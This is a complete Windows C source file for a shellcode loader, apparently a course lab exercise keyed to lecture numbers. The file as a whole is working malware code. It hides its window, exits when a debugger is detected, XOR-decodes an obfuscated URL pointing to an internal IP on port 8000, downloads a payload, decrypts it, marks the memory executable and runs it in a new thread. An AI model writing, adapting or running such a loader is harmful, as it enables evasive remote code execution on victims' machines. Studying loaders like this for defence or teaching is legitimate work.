#include <Windows.h>
#include <wininet.h>

#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:mainCRTStartup")
#pragma comment(lib, "wininet.lib")
#pragma warning(disable: 4996)

int main() {
    // 1. ANTI-DEBUGGING (Lecture 7.6)
    if (IsDebuggerPresent()) {
        return 1;
    }

    // 2. STRING OBFUSCATION (Lecture 7.1)
    // URL: http://10.1.136.119:8000/payload.bin (XORed with 0x55)
    char url[] = { 0x3d, 0x21, 0x21, 0x25, 0x6f, 0x7a, 0x7a, 0x64, 0x65, 0x7b, 0x64, 0x7b, 0x64, 0x66, 0x63, 0x7b, 0x64, 0x64, 0x6c, 0x6f, 0x6d, 0x65, 0x65, 0x65, 0x7a, 0x25, 0x34, 0x2c, 0x39, 0x3a, 0x34, 0x31, 0x7b, 0x37, 0x3c, 0x3b, 0x00 };

    // Decrypt URL in memory
    for (int i = 0; url[i] != '\0'; i++) {
        url[i] = url[i] ^ 0x55;
    }

    // 3. NETWORK DOWNLOAD
    HINTERNET hInternet = InternetOpenA("Loader/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) return 1;

    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, 0, 0);
    if (hUrl == NULL) {
        InternetCloseHandle(hInternet);
        return 1;
    }

    BYTE* shellcode = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024);
    DWORD totalRead = 0;
    DWORD bytesRead = 0;

    while (InternetReadFile(hUrl, shellcode + totalRead, (1024 * 1024) - totalRead, &bytesRead) && bytesRead > 0) {
        totalRead += bytesRead;
    }

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    if (totalRead == 0) {
        HeapFree(GetProcessHeap(), 0, shellcode);
        return 1;
    }

    // 4. PAYLOAD DECRYPTION (Lecture 7.1)
    for (DWORD i = 0; i < totalRead; i++) {
        shellcode[i] = shellcode[i] ^ 0xAA;
    }

    // 5. FILELESS EXECUTION (Lecture 7.2)
    LPVOID allocated_mem = VirtualAlloc(NULL, totalRead, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    if (allocated_mem == NULL) {
        HeapFree(GetProcessHeap(), 0, shellcode);
        return 1;
    }

    RtlCopyMemory(allocated_mem, shellcode, totalRead);
    HeapFree(GetProcessHeap(), 0, shellcode);

    DWORD oldProtect;
    if (!VirtualProtect(allocated_mem, totalRead, PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFree(allocated_mem, 0, MEM_RELEASE);
        return 1;
    }

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocated_mem, NULL, 0, NULL);
    if (hThread == NULL) {
        VirtualFree(allocated_mem, 0, MEM_RELEASE);
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(allocated_mem, 0, MEM_RELEASE);

    return 0;
}
